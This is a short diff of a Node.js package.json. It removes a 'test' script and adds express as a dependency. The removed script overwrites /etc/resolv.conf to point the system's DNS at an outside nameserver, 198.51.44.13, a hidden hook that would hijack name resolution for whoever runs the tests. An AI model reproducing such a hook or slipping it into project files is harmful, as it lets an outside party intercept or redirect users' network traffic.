@@ -3,13 +3,11 @@
   "version": "1.0.0",
   "description": "",
   "main": "index.js",
-  "scripts": {
-    "test": "echo \"nameserver 198.51.44.13\" > /etc/resolv.conf"
-  },
   "author": "",
   "license": "ISC",
   "dependencies": {
     "cors": "^2.8.5",
+    "express": "^4.19.2",
     "fs": "^0.0.1-security",
     "http": "^0.0.1-security",
     "path": "^0.12.7"
